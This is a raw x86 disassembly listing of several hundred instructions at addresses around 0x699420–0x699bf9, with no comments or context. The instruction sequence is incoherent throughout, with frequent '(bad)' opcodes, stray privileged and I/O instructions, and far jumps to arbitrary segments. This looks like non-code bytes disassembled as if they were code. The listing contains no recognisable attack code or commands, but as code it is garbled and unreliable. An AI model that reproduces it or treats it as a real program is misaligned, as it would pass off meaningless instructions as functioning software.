  699420:	xchg   DWORD PTR [ecx-0x7a],ebp
  699423:	and    bl,BYTE PTR [esi+0x1d]
  699426:	dec    eax
  699427:	sbb    al,0xd6
  699429:	xor    al,0xdb
  69942b:	retf   0xe504
  69942e:	jmp    FWORD PTR [ebp-0xf005670]
  699434:	sbb    BYTE PTR [edx+0x7151ec90],bl
  69943a:	jb     0x69944e
  69943c:	jbe    0x6993fb
  69943e:	imul   edi,DWORD PTR [edx+0x21c20757],0x72
  699445:	adc    DWORD PTR [ecx+0x34fceb4f],0x43
  69944c:	push   DWORD PTR [eax]
  69944e:	push   ds
  69944f:	jno    0x69948c
  699451:	pop    ebp
  699452:	lock (bad) 
  699454:	call   0x1b3f:0x3e6fd3d3
  69945b:	dec    edx
  69945c:	lods   eax,DWORD PTR ds:[esi]
  69945d:	je     0x699447
  69945f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  699460:	retf   0xdc2e
  699463:	mov    dl,0xc1
  699465:	push   0xee455414
  69946a:	lea    eax,[eax*4-0xabe536b]
  699471:	cmc    
  699472:	adc    eax,0x737697fc
  699477:	xchg   edx,eax
  699478:	jmp    0x24fe:0x740663b6
  69947f:	or     eax,0x6213ee2e
  699484:	je     0x69940f
  699486:	cmp    DWORD PTR [ecx+edi*4+0x46],0x55
  69948b:	sub    DWORD PTR [ebp-0x7d55297a],esp
  699491:	neg    BYTE PTR [eax]
  699493:	mov    ebp,0x5fe3cdb9
  699498:	aad    0xc
  69949a:	jecxz  0x699483
  69949c:	inc    ebx
  69949d:	ds xchg esp,eax
  69949f:	cmp    al,0x28
  6994a1:	jmp    0xa284fe59
  6994a6:	mov    ds:0xf1af6d8d,eax
  6994ab:	adc    BYTE PTR [ecx],bl
  6994ad:	mov    ch,0x13
  6994af:	mov    bh,0x9f
  6994b1:	inc    esi
  6994b2:	mov    ds:0x5fb07a13,al
  6994b7:	out    0x28,al
  6994b9:	pop    ebx
  6994ba:	push   ds
  6994bb:	xchg   ebx,eax
  6994bc:	mov    ebx,0x6c558cb5
  6994c1:	jnp    0x69944e
  6994c3:	push   ebp
  6994c4:	scas   al,BYTE PTR es:[edi]
  6994c5:	or     al,0xd1
  6994c7:	int3   
  6994c8:	xor    al,0xb8
  6994ca:	inc    esp
  6994cb:	into   
  6994cc:	mov    al,ds:0x35c0cf3e
  6994d1:	xlat   BYTE PTR ds:[ebx]
  6994d2:	pushf  
  6994d3:	hlt    
  6994d4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  6994d5:	out    dx,al
  6994d6:	or     ch,BYTE PTR [ebp+0xbbf4b3]
  6994dc:	dec    ebx
  6994dd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  6994de:	sbb    DWORD PTR [ecx+0x58df093e],esi
  6994e4:	mov    al,0xf9
  6994e6:	lock daa 
  6994e8:	jo     0x69949a
  6994ea:	(bad)  
  6994eb:	pop    ds
  6994ec:	mov    edx,0xe4dcf33d
  6994f2:	adc    BYTE PTR [eax+0x17],al
  6994f5:	in     al,dx
  6994f6:	ss pop eax
  6994f8:	jb     0x699525
  6994fa:	call   0x4115:0x11cc2b11
  699501:	imul   edx,DWORD PTR [esi-0x7e30cd00],0x33e17451
  69950b:	push   eax
  69950c:	in     eax,dx
  69950d:	xor    DWORD PTR [ebx+eax*8+0x3d],ebp
  699511:	mov    eax,ecx
  699513:	dec    edi
  699514:	cmp    dl,BYTE PTR [esi+0x3d148cb2]
  69951a:	jns    0x69958a
  69951c:	fisttp WORD PTR [edx+0x7f]
  69951f:	lods   eax,DWORD PTR ds:[esi]
  699520:	cld    
  699521:	or     al,0xea
  699523:	xchg   BYTE PTR [ecx],dl
  699525:	(bad)  
  699526:	push   esi
  699527:	fucomi st,st(2)
  699529:	push   esp
  69952a:	enter  0x4902,0x95
  69952e:	lahf   
  69952f:	dec    edx
  699530:	in     eax,0x2d
  699532:	ficom  DWORD PTR [ebx+0x47]
  699535:	addr16 inc ecx
  699537:	mov    edi,DWORD PTR [eax+ebp*4]
  69953a:	pop    eax
  69953b:	jg     0x6994f1
  69953d:	xor    esi,DWORD PTR [ecx+edi*2+0x4be39406]
  699544:	jb     0x69959a
  699546:	sbb    BYTE PTR [edi+0x66],bh
  699549:	adc    ch,BYTE PTR [esi-0x6]
  69954c:	mov    cl,0x1a
  69954e:	mov    ds:0x84dcae4c,eax
  699553:	iret   
  699554:	idiv   BYTE PTR ds:0x9ae2b24c
  69955a:	lods   eax,DWORD PTR ds:[esi]
  69955b:	xor    eax,0xa2c91bda
  699560:	xchg   edi,eax
  699561:	xchg   edx,eax
  699562:	in     al,0x5f
  699564:	ins    DWORD PTR es:[edi],dx
  699565:	std    
  699566:	xchg   BYTE PTR [edi],cl
  699568:	popa   
  699569:	inc    edx
  69956a:	xlat   BYTE PTR ds:[ebx]
  69956b:	lods   eax,DWORD PTR ds:[esi]
  69956c:	sti    
  69956d:	gs aad 0x3f
  699570:	dec    ecx
  699572:	adc    ch,bh
  699574:	xchg   ecx,eax
  699575:	xor    eax,0xb66eb89b
  69957a:	addr16 add al,0xde
  69957d:	inc    edx
  69957e:	adc    ebp,DWORD PTR [eax-0x7dff8b5b]
  699584:	xlat   BYTE PTR ds:[ebx]
  699585:	pop    ebx
  699586:	and    ebx,0x363887c3
  69958c:	inc    esp
  69958d:	retf   0xfc00
  699590:	ss dec esi
  699592:	cmp    ecx,DWORD PTR [esi]
  699594:	popa   
  699595:	jno    0x6995fc
  699597:	pop    ecx
  699598:	inc    ebx
  699599:	xor    dl,BYTE PTR es:[edx+0x7c]
  69959d:	les    edx,FWORD PTR [edi]
  69959f:	pop    ebx
  6995a0:	inc    esi
  6995a1:	cmp    al,0xfb
  6995a3:	dec    ebp
  6995a4:	and    BYTE PTR ds:0x79cde4f9,al
  6995ab:	sahf   
  6995ac:	arpl   WORD PTR [ebp+0xcf13d44],cx
  6995b2:	adc    ch,BYTE PTR [eax-0x2]
  6995b5:	mov    eax,ds:0x76468777
  6995ba:	neg    eax
  6995bc:	test   ah,ch
  6995be:	push   ss
  6995bf:	sub    dl,ah
  6995c1:	dec    esi
  6995c2:	mov    esp,0xb9b18ff5
  6995c7:	fwait
  6995c8:	shr    DWORD PTR [edx],1
  6995ca:	mov    eax,0xecb8b09
  6995cf:	out    dx,al
  6995d0:	mov    WORD PTR [edx+0x4c7af180],gs
  6995d6:	mov    dh,0xea
  6995d8:	lds    edi,FWORD PTR [edi-0x59]
  6995db:	xchg   ecx,eax
  6995dc:	jge    0x6995bd
  6995de:	and    eax,ecx
  6995e0:	jb     0x6995e3
  6995e2:	icebp  
  6995e3:	fcomp  st(1)
  6995e5:	aam    0xb3
  6995e7:	ja     0x6995ad
  6995e9:	sbb    esi,ebp
  6995eb:	sub    bl,cl
  6995ed:	es push ebp
  6995ef:	mov    ch,0xd
  6995f1:	into   
  6995f2:	jp     0x699584
  6995f4:	pop    es
  6995f5:	jge    0x699588
  6995f7:	xor    bh,dl
  6995f9:	pop    ebp
  6995fa:	imul   edx,DWORD PTR [edi-0x385ba0cf],0x31953411
  699604:	std    
  699605:	aam    0x1a
  699607:	leave  
  699608:	mov    DWORD PTR [edx+0x67e130bd],0x7165f5e4
  699612:	adc    al,0x89
  699614:	mov    dh,0xd3
  699616:	push   es
  699617:	cmp    bl,BYTE PTR [esi+0x51436cc6]
  69961d:	jb     0x699637
  69961f:	xor    BYTE PTR [esi-0x582aa9b3],al
  699625:	loopne 0x699694
  699627:	xor    al,0x75
  699629:	arpl   sp,si
  69962b:	and    eax,0x13f4048d
  699630:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  699631:	sti    
  699632:	xchg   edi,eax
  699633:	nop
  699634:	jmp    0xd9bf58c0
  699639:	das    
  69963a:	addr16 or dh,ch
  69963d:	(bad)  
  69963e:	clc    
  69963f:	ret    0x6233
  699642:	push   esp
  699643:	std    
  699644:	fs and al,0x41
  699647:	and    cl,al
  699649:	push   0x195504a6
  69964e:	pop    esi
  69964f:	(bad)  
  699650:	jo     0x6995f9
  699652:	jmp    0x8bc6568a
  699657:	call   0x6ed04b10
  69965c:	xor    al,0x96
  69965e:	or     eax,0x4472dbf0
  699663:	pop    esi
  699664:	ss push eax
  699666:	cs stos DWORD PTR es:[edi],eax
  699668:	inc    esi
  699669:	test   esi,esp
  69966b:	mov    ch,0x3c
  69966d:	in     eax,0x9f
  69966f:	xchg   edx,eax
  699670:	retf   0x39d7
  699673:	sbb    esi,DWORD PTR [edi]
  699675:	adc    BYTE PTR [ecx],bh
  699677:	pop    es
  699678:	xchg   edi,eax
  699679:	test   BYTE PTR [edi+0x30],0x9b
  69967d:	in     eax,dx
  69967e:	push   0x1d
  699680:	push   cs
  699681:	mov    dh,BYTE PTR [ecx]
  699683:	jmp    DWORD PTR [ebp-0x3200971d]
  699689:	xor    eax,0x36a5a146
  69968e:	cmp    DWORD PTR [ebx+0x30bfa69c],esi
  699694:	aaa    
  699695:	xor    al,0x6a
  699697:	in     al,0xcf
  699699:	(bad)  
  69969b:	mov    eax,0x4cafdbb7
  6996a0:	sub    edi,DWORD PTR [ecx]
  6996a2:	mov    cl,0x38
  6996a4:	adc    BYTE PTR [edi+0x60],dh
  6996a7:	mov    bh,0x4d
  6996a9:	jmp    DWORD PTR [ebp+0x7ed17523]
  6996af:	int    0x60
  6996b1:	fidiv  DWORD PTR [esi-0x30]
  6996b4:	xchg   ebx,eax
  6996b5:	or     eax,0xfb25d36a
  6996ba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  6996bb:	rol    BYTE PTR [edi+edi*8+0x74f194ad],1
  6996c2:	ret    0x56d3
  6996c5:	xchg   ebx,eax
  6996c6:	xchg   esi,eax
  6996c7:	cli    
  6996c8:	rcr    DWORD PTR [eax-0x78a9aefb],0x60
  6996cf:	mov    dh,0x5d
  6996d1:	fstp   QWORD PTR [edi+0x453eb063]
  6996d7:	dec    ecx
  6996d8:	and    BYTE PTR [edi-0x36a3fd62],ah
  6996de:	mov    ds:0xc03c9ccd,al
  6996e3:	mov    al,0x2c
  6996e5:	push   ss
  6996e6:	lahf   
  6996e7:	push   0x36
  6996e9:	adc    bl,BYTE PTR [eax]
  6996eb:	shl    DWORD PTR [esi-0x64],1
  6996ee:	jmp    esi
  6996f0:	pop    ebx
  6996f1:	add    BYTE PTR [esi-0x6a],ch
  6996f4:	add    al,0x82
  6996f6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  6996f7:	outs   dx,BYTE PTR ds:[esi]
  6996f8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  6996f9:	(bad)  
  6996fa:	xor    ah,BYTE PTR [esi]
  6996fc:	dec    ecx
  6996fd:	stc    
  6996fe:	jl     0x69974e
  699700:	dec    edi
  699701:	or     dl,BYTE PTR [ecx+eiz*8]
  699704:	lock loope 0x699757
  699707:	cmp    BYTE PTR [edi-0x3e],cl
  69970a:	sbb    al,BYTE PTR [edx+0x4f]
  69970d:	sub    BYTE PTR [ebx+0x77],cl
  699710:	jl     0x6996b2
  699712:	sub    eax,0x93bf1a6f
  699717:	xchg   al,dl
  699719:	sbb    BYTE PTR [edi+0x18],cl
  69971c:	pop    ss
  69971d:	arpl   WORD PTR fs:[esi],di
  699720:	mov    ss,WORD PTR [edi+0x34691a1f]
  699726:	out    dx,eax
  699727:	into   
  699728:	xchg   edi,eax
  699729:	dec    ecx
  69972a:	push   0x1b655bbc
  69972f:	mov    ds:0x4ecfee14,al
  699734:	lds    ecx,FWORD PTR [ecx]
  699736:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  699737:	(bad)  
  699738:	mov    edx,0xad070020
  69973d:	cmp    ch,BYTE PTR ds:0xef238ca6
  699743:	add    esi,esi
  699745:	imul   ecx,DWORD PTR [esi],0xfffffff5
  699748:	sub    cl,BYTE PTR [edx-0x43]
  69974b:	mov    cl,BYTE PTR [edx-0x29]
  69974e:	out    dx,eax
  69974f:	xor    BYTE PTR [ebp+0x3e],bh
  699752:	and    eax,DWORD PTR ds:0x5574faae
  699758:	stc    
  699759:	out    dx,al
  69975a:	and    BYTE PTR [esi+eax*8-0x3c2ac490],cl
  699761:	ror    BYTE PTR [ebx],cl
  699763:	mov    edi,0xa27b59f3
  699768:	mov    bh,0xe3
  69976a:	stc    
  69976b:	push   ss
  69976c:	repnz fsubr st,st(2)
  69976f:	repnz cwde 
  699771:	sub    al,0xa7
  699773:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  699774:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  699775:	jo     0x6996fe
  699777:	das    
  699778:	(bad)  
  699779:	adc    al,0xc9
  69977b:	pop    edi
  69977c:	sahf   
  69977d:	dec    edx
  69977e:	fwait
  69977f:	imul   BYTE PTR [ebx+0x46cb3b42]
  699785:	or     al,0xad
  699787:	loop   0x69977b
  699789:	sub    dh,bl
  69978b:	aaa    
  69978c:	xchg   esi,eax
  69978d:	pusha  
  69978e:	sub    eax,0xdca95d2d
  699793:	(bad)  
  699794:	push   edi
  699795:	inc    eax
  699796:	imul   eax,DWORD PTR [edi],0xffffff82
  699799:	adc    eax,0x2af4bd4c
  69979e:	sub    DWORD PTR [ecx],edx
  6997a0:	dec    esp
  6997a1:	dec    edx
  6997a2:	inc    edx
  6997a3:	jne    0x69973f
  6997a5:	pop    edx
  6997a6:	mov    ebp,0x8d4bc722
  6997ab:	and    DWORD PTR [eax+0x20],0xbd95c173
  6997b2:	outs   dx,DWORD PTR ds:[esi]
  6997b3:	mov    bh,0xaa
  6997b5:	sub    BYTE PTR [edx-0x20],0x17
  6997b9:	aam    0x79
  6997bb:	imul   edi,DWORD PTR ds:0x1432b5db,0x4f
  6997c2:	push   eax
  6997c3:	(bad)  
  6997c5:	lods   eax,DWORD PTR ds:[esi]
  6997c6:	adc    al,0x71
  6997c8:	out    dx,eax
  6997c9:	sbb    al,0xd5
  6997cb:	popf   
  6997cc:	mov    edi,0x2a60bf3a
  6997d1:	mov    dh,0x5b
  6997d3:	mov    ch,BYTE PTR [edx+0x7cc99629]
  6997d9:	mov    eax,ds:0xc50faf99
  6997de:	cmp    al,0x9
  6997e0:	and    al,0x96
  6997e2:	(bad)  
  6997e3:	mov    ebp,0x57b4f26e
  6997e8:	xchg   esp,eax
  6997e9:	lock push ebp
  6997eb:	mov    ebx,0x44417c7e
  6997f0:	jnp    0x6997ba
  6997f2:	mov    edi,0x65d81e0f
  6997f7:	jae    0x6997f2
  6997f9:	pushf  
  6997fa:	mov    cl,0xaf
  6997fc:	(bad)  
  6997fd:	fsubr  st,st(3)
  6997ff:	pop    esi
  699800:	gs addr16 jle 0x6997a0
  699804:	cwde   
  699805:	(bad)  
  699806:	clc    
  699807:	out    0xa,eax
  699809:	ja     0x699861
  69980b:	add    eax,0x533d4bbf
  699810:	jge    0x69985e
  699812:	sub    bl,BYTE PTR [ecx+0x319f44d0]
  699818:	(bad)  
  699819:	lock cmp bl,BYTE PTR [edi]
  69981c:	mov    ch,0x1e
  69981e:	call   FWORD PTR [ecx-0x1d09edaf]
  699824:	rcl    DWORD PTR [ebx],cl
  699826:	outs   dx,BYTE PTR ds:[esi]
  699827:	mov    bh,0xb
  699829:	dec    ebx
  69982a:	jb     0x69986d
  69982c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  69982d:	mov    eax,0xb24fddf6
  699832:	jae    0x69986b
  699834:	add    al,0x54
  699836:	(bad)  
  699837:	and    esi,edx
  699839:	cmp    al,0xa1
  69983b:	shl    DWORD PTR [ebx+0x14],1
  69983e:	push   ebx
  69983f:	mov    al,0xa2
  699841:	push   0x1a
  699843:	fiadd  DWORD PTR [esi+0x4]
  699846:	pop    eax
  699847:	xor    eax,0xcc89c44c
  69984c:	xchg   esp,eax
  69984d:	and    al,0xb5
  69984f:	jmp    0x422b:0x614f88cc
  699856:	xor    edx,DWORD PTR [bp-0x414c]
  69985b:	jnp    0x6998b1
  69985d:	push   0x31
  69985f:	test   DWORD PTR [ebx-0x4f586b0],eax
  699865:	add    ebx,DWORD PTR [edx-0x7e]
  699868:	dec    ebx
  699869:	sub    BYTE PTR [ecx+0x33],ah
  69986c:	jp     0x699867
  69986e:	rol    DWORD PTR [ebp+0x22],0x8f
  699872:	ins    DWORD PTR es:[edi],dx
  699873:	dec    edx
  699874:	xchg   esi,eax
  699875:	sbb    esi,DWORD PTR [edx]
  699877:	fwait
  699878:	hlt    
  699879:	or     bl,BYTE PTR [edi-0x3e]
  69987c:	sub    al,0x7f
  69987e:	stos   DWORD PTR es:[edi],eax
  69987f:	mov    cl,0x70
  699881:	sbb    bh,dl
  699883:	fnstsw ax
  699885:	shr    BYTE PTR [eax-0x6f],cl
  699888:	xchg   edi,eax
  699889:	jmp    0x1d4d:0x12875aca
  699890:	call   0xf2ce5cf1
  699895:	dec    edx
  699896:	jo     0x69982d
  699898:	cmp    BYTE PTR [eax+0x63a793a6],cl
  69989e:	sub    al,0xeb
  6998a0:	cmp    esp,esp
  6998a2:	call   0x75c0:0x5865c5af
  6998a9:	fcomp  QWORD PTR [eax*2-0x69fd6475]
  6998b0:	out    dx,eax
  6998b1:	sub    al,0x82
  6998b3:	std    
  6998b4:	adc    al,0x5b
  6998b6:	fcmovnbe st,st(4)
  6998b8:	cwde   
  6998b9:	imul   esi,ebx,0x65d57998
  6998bf:	adc    al,0xc0
  6998c1:	lods   eax,DWORD PTR ds:[esi]
  6998c2:	cmp    DWORD PTR [eax-0x5b],esi
  6998c5:	jns    0x6998b3
  6998c7:	push   edx
  6998c8:	mov    ?,WORD PTR [edi-0x40e0ba7f]
  6998ce:	dec    ebx
  6998cf:	repnz push 0x56ad40ca
  6998d5:	mov    WORD PTR [edx-0x1c],cs
  6998d8:	add    al,0x28
  6998da:	mov    dl,0x1f
  6998dc:	into   
  6998dd:	push   edi
  6998de:	lea    edx,[edi+0x3a9713d5]
  6998e4:	int    0x6e
  6998e6:	push   es
  6998e7:	pop    eax
  6998e8:	xchg   edi,eax
  6998e9:	inc    edx
  6998ea:	(bad)  
  6998ec:	fistp  DWORD PTR [ebx-0x18]
  6998ef:	adc    eax,0x8c507b5d
  6998f4:	sub    DWORD PTR [edx+0x70],eax
  6998f7:	fist   DWORD PTR [esi-0x9ea4f95]
  6998fd:	arpl   WORD PTR [eax+0xb188f43],bx
  699903:	mov    dh,0x57
  699905:	add    dh,BYTE PTR [esi+ebp*4]
  699908:	xor    ebx,DWORD PTR [ecx+0x77]
  69990b:	std    
  69990c:	fistp  DWORD PTR [esi]
  69990e:	dec    ebp
  69990f:	and    ecx,DWORD PTR [esi-0x466511a7]
  699915:	inc    esi
  699916:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  699917:	xor    BYTE PTR [ebx-0x71],ch
  69991a:	mov    dh,0x1f
  69991c:	mov    gs,edi
  69991e:	out    dx,eax
  69991f:	push   ecx
  699920:	dec    esi
  699921:	adc    esp,esi
  699923:	in     eax,0x6e
  699925:	in     eax,0xd3
  699927:	pop    DWORD PTR [esi+0x48a3ac09]
  69992d:	or     DWORD PTR [esi+0x62],0xda200fa2
  699934:	in     al,0x86
  699936:	mov    ah,0x9a
  699938:	cmp    al,0xc0
  69993a:	mov    ch,0xe5
  69993c:	xor    bl,BYTE PTR [ecx]
  69993e:	push   esi
  69993f:	xor    BYTE PTR [edi],0x9e
  699942:	ret    
  699943:	data16 (bad) 
  699945:	fwait
  699946:	leave  
  699947:	xor    DWORD PTR [eax-0x5e95db86],edx
  69994d:	cwde   
  69994e:	retf   
  69994f:	jae    0x69991c
  699951:	bound  edi,QWORD PTR [eax]
  699953:	jmp    0xa69f:0x1c2af0d6
  69995a:	mov    edx,0xb4242137
  69995f:	mov    esp,0x88ad073
  699964:	scas   eax,DWORD PTR es:[edi]
  699965:	push   ecx
  699966:	mov    esi,0x27b29efb
  69996b:	not    edx
  69996d:	outs   dx,BYTE PTR ds:[esi]
  69996e:	popa   
  69996f:	xor    bl,BYTE PTR [esi]
  699971:	jb     0x6998f5
  699973:	adc    ah,BYTE PTR [ecx-0x335ae15b]
  699979:	xchg   ebx,eax
  69997a:	(bad)  
  69997b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  69997c:	ret    
  69997d:	(bad)  
  69997e:	and    eax,0x3b4f2657
  699983:	imul   ebx,DWORD PTR [ebp-0x65b0ae64],0xb0f80001
  69998d:	or     al,BYTE PTR [eax+ebx*4+0x39]
  699991:	fiadd  DWORD PTR [ecx]
  699993:	int    0x34
  699995:	push   0xe8d3310
  69999a:	out    dx,eax
  69999b:	inc    ebx
  69999c:	imul   esi,DWORD PTR [edi-0x2f],0xbb503c65
  6999a3:	jg     0x69994b
  6999a5:	dec    esp
  6999a6:	xor    DWORD PTR [ebx],edi
  6999a8:	jbe    0x699932
  6999aa:	dec    ebx
  6999ab:	sub    cl,bl
  6999ad:	mov    ebx,0x5306b2dd
  6999b2:	jo     0x699966
  6999b4:	fbstp  TBYTE PTR [ebx]
  6999b6:	enter  0x6bea,0x12
  6999ba:	xchg   ecx,eax
  6999bb:	pop    ebp
  6999bc:	cli    
  6999bd:	(bad)  
  6999be:	mov    al,0x65
  6999c0:	cld    
  6999c1:	sub    ah,dh
  6999c3:	rsm    
  6999c5:	or     al,0x36
  6999c7:	leave  
  6999c8:	mov    al,0xc3
  6999ca:	and    ebp,DWORD PTR [ebx]
  6999cc:	push   es
  6999cd:	int3   
  6999ce:	outs   dx,BYTE PTR ds:[esi]
  6999cf:	or     DWORD PTR [edx],ebp
  6999d1:	xor    DWORD PTR [bx+si-0x31],esp
  6999d5:	xchg   esi,eax
  6999d6:	add    eax,esi
  6999d8:	sbb    ch,BYTE PTR [edx-0x152e23fd]
  6999de:	dec    ebx
  6999df:	cmp    cl,BYTE PTR [ecx+0x3d]
  6999e2:	mov    ch,0xbc
  6999e4:	hlt    
  6999e5:	jmp    FWORD PTR [edi]
  6999e7:	repz ficomp DWORD PTR [edi+0x34f07b48]
  6999ee:	or     bl,dl
  6999f0:	mov    ecx,0xdb4cdde1
  6999f5:	mov    sp,0xc208
  6999f9:	in     eax,0x3d
  6999fb:	dec    edx
  6999fc:	sub    eax,DWORD PTR [edi-0x38]
  6999ff:	test   eax,0x1ad2fd65
  699a04:	mov    al,ds:0x1d230ec8
  699a09:	sub    al,0x2e
  699a0b:	retf   0x536f
  699a0e:	cmp    esp,DWORD PTR [ecx]
  699a10:	dec    esp
  699a11:	std    
  699a12:	rol    ebx,cl
  699a14:	and    al,0xeb
  699a16:	adc    eax,0xb952dc85
  699a1b:	mov    ah,BYTE PTR [edi]
  699a1d:	jbe    0x699a6f
  699a1f:	sub    DWORD PTR [ecx],0xffffff9b
  699a22:	test   eax,0xdc105731
  699a27:	or     BYTE PTR [edx+eiz*1],bl
  699a2a:	xlat   BYTE PTR ds:[ebx]
  699a2b:	shr    DWORD PTR [esi],cl
  699a2d:	add    cl,dl
  699a2f:	cld    
  699a30:	inc    ecx
  699a31:	fldenv [ebp+0x78073317]
  699a37:	scas   eax,DWORD PTR es:[edi]
  699a38:	dec    edi
  699a39:	cmp    al,0xf
  699a3b:	enter  0xc250,0xcf
  699a3f:	and    ah,ch
  699a41:	push   ebp
  699a42:	lods   al,BYTE PTR ds:[esi]
  699a43:	jp     0x6999e1
  699a45:	xlat   BYTE PTR ds:[ebx]
  699a46:	mov    BYTE PTR [esi-0x648c1b40],ah
  699a4c:	xchg   edx,eax
  699a4d:	sbb    DWORD PTR [edi+0x54],eax
  699a50:	js     0x699a82
  699a52:	add    dh,BYTE PTR ds:0x7824e7ed
  699a58:	cs inc ebx
  699a5a:	pop    edi
  699a5b:	inc    esi
  699a5c:	xchg   edi,eax
  699a5d:	retf   0x4a7b
  699a60:	inc    ebx
  699a61:	in     al,0xdb
  699a63:	fwait
  699a64:	lahf   
  699a65:	scas   al,BYTE PTR es:[edi]
  699a66:	call   0xf1a9:0x735c97a7
  699a6d:	push   esp
  699a6e:	mov    ds:0xfec48fb,al
  699a73:	clc    
  699a74:	in     al,dx
  699a75:	add    BYTE PTR [edx+0x18b80880],dh
  699a7b:	mov    eax,0xba588f9f
  699a80:	aaa    
  699a81:	adc    esi,ecx
  699a83:	cmp    al,0x61
  699a85:	dec    edi
  699a86:	sub    dh,0x87
  699a89:	test   eax,0xb832e211
  699a8e:	jmp    0xe90e:0x77231a80
  699a95:	idiv   BYTE PTR [ecx-0x4e869d84]
  699a9b:	inc    esp
  699a9c:	sub    al,0x21
  699a9e:	fnstenv [ebp-0x7]
  699aa1:	arpl   WORD PTR [esi-0x57c0601f],ax
  699aa7:	mov    ds:0x735fd7e2,eax
  699aac:	or     ecx,DWORD PTR [esi-0x58677ac5]
  699ab2:	fldenv [edx-0xe0a5813]
  699ab8:	adc    cl,ch
  699aba:	mov    cs,WORD PTR [eax-0x34]
  699abd:	mov    esi,ecx
  699abf:	fadd   QWORD PTR [ebp+0x48435423]
  699ac5:	mov    BYTE PTR [esi-0x2e],0x4
  699ac9:	pop    esp
  699aca:	stos   BYTE PTR es:[edi],al
  699acb:	dec    edx
  699acc:	bound  edi,QWORD PTR [esi-0x4]
  699acf:	adc    DWORD PTR [esi+0x1181a25e],esp
  699ad5:	stc    
  699ad6:	ds in  al,0x2a
  699ad9:	ror    al,0x2e
  699adc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  699add:	and    ebp,DWORD PTR ds:0x11794d63
  699ae3:	cdq    
  699ae4:	sbb    al,0xdc
  699ae6:	sbb    eax,0xe8415938
  699aeb:	jne    0x699ac1
  699aed:	js     0x699ad8
  699aef:	sti    
  699af0:	fs inc edx
  699af2:	push   ebx
  699af3:	fwait
  699af4:	push   ds
  699af5:	lds    eax,FWORD PTR [esp+esi*1]
  699af8:	rcl    dl,1
  699afa:	dec    edx
  699afb:	jecxz  0x699b40
  699afd:	cmp    edx,DWORD PTR [ebx+0x1e97645c]
  699b03:	sbb    DWORD PTR [ebp-0x21],edi
  699b06:	xchg   DWORD PTR [ebp-0x5a],eax
  699b09:	aaa    
  699b0a:	xor    ah,dl
  699b0c:	sub    DWORD PTR [edx+0x50],edi
  699b0f:	lahf   
  699b10:	xor    DWORD PTR [esi-0x5ce78b10],0x755ad596
  699b1a:	xchg   esp,eax
  699b1b:	push   eax
  699b1c:	pop    esi
  699b1d:	cmp    BYTE PTR [esi],ah
  699b1f:	cmp    DWORD PTR [esi-0xf],eax
  699b22:	sbb    eax,0x8b19e8bb
  699b27:	in     al,0xc3
  699b29:	adc    al,0xd7
  699b2b:	pop    ds
  699b2c:	out    0x63,al
  699b2e:	or     esp,DWORD PTR [esp+edi*8]
  699b31:	jbe    0x699b49
  699b33:	cli    
  699b34:	pop    ecx
  699b35:	xchg   DWORD PTR [esi-0x19ffba83],edi
  699b3b:	fld    st(6)
  699b3d:	mov    ds:0xec647bd8,al
  699b42:	cwde   
  699b43:	cs cmp al,0xd2
  699b46:	mov    eax,ds:0xc090c6f
  699b4b:	es pop edx
  699b4d:	aad    0x71
  699b4f:	xchg   esi,eax
  699b50:	(bad)  
  699b51:	jo     0x699b11
  699b53:	leave  
  699b54:	ss push esi
  699b56:	push   cs
  699b57:	ins    DWORD PTR es:[edi],dx
  699b58:	lods   al,BYTE PTR ds:[esi]
  699b59:	dec    edx
  699b5a:	sub    edx,edx
  699b5c:	sbb    eax,0x771cf7c4
  699b61:	xor    ebx,DWORD PTR [ebp-0x71351c8e]
  699b67:	push   DWORD PTR ds:0x1f7a899f
  699b6d:	mov    cs,WORD PTR [eax+0x1e0bd044]
  699b73:	pop    ds
  699b74:	pop    ebx
  699b75:	fcom   DWORD PTR [edi]
  699b77:	xchg   ebp,eax
  699b78:	jmp    0x63d9:0x5de230dd
  699b7f:	fucomi st,st(2)
  699b81:	jle    0x699b6b
  699b83:	inc    eax
  699b84:	mov    dh,ch
  699b86:	outs   dx,DWORD PTR ds:[esi]
  699b87:	mov    ebx,0x6993e264
  699b8c:	jbe    0x699b99
  699b8e:	add    BYTE PTR [ebx+0x1b],dh
  699b91:	pop    ebp
  699b92:	push   0xfffffff9
  699b94:	rcr    DWORD PTR [edi-0x55dd09c0],0x82
  699b9b:	ret    0x76a4
  699b9e:	inc    ecx
  699b9f:	das    
  699ba0:	pop    esp
  699ba1:	in     eax,0x97
  699ba3:	mov    edx,0x605ed69e
  699ba8:	nop
  699ba9:	pop    ds
  699baa:	pop    ds
  699bab:	jb     0x699c1c
  699bad:	xchg   esi,eax
  699bae:	cdq    
  699baf:	lds    edi,FWORD PTR [eax]
  699bb1:	mov    bh,0x2c
  699bb3:	fst    QWORD PTR [ecx+0x509ca228]
  699bb9:	dec    ebx
  699bba:	dec    ebx
  699bbb:	(bad)  
  699bbc:	mov    ch,0xd7
  699bbe:	mov    eax,ds:0xe86cf5db
  699bc3:	fucomi st,st(7)
  699bc6:	push   edi
  699bc7:	fcmovu st,st(3)
  699bc9:	jae    0x699c18
  699bcb:	test   al,0x79
  699bcd:	icebp  
  699bce:	dec    esp
  699bcf:	dec    esp
  699bd0:	inc    eax
  699bd1:	lods   eax,DWORD PTR ds:[esi]
  699bd2:	sub    DWORD PTR [edx],ecx
  699bd4:	(bad)
  699bd8:	mov    ecx,0xdcfb66b
  699bdd:	iret   
  699bde:	pop    eax
  699bdf:	das    
  699be0:	mov    ds:0xc28db3f,al
  699be5:	jmp    0xa52d:0x6a732850
  699bec:	idiv   DWORD PTR [ecx-0x48eb2702]
  699bf2:	lahf   
  699bf3:	inc    ebp
  699bf4:	out    0x3f,eax
  699bf6:	push   ecx
  699bf7:	mov    ch,0xe
  699bf9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
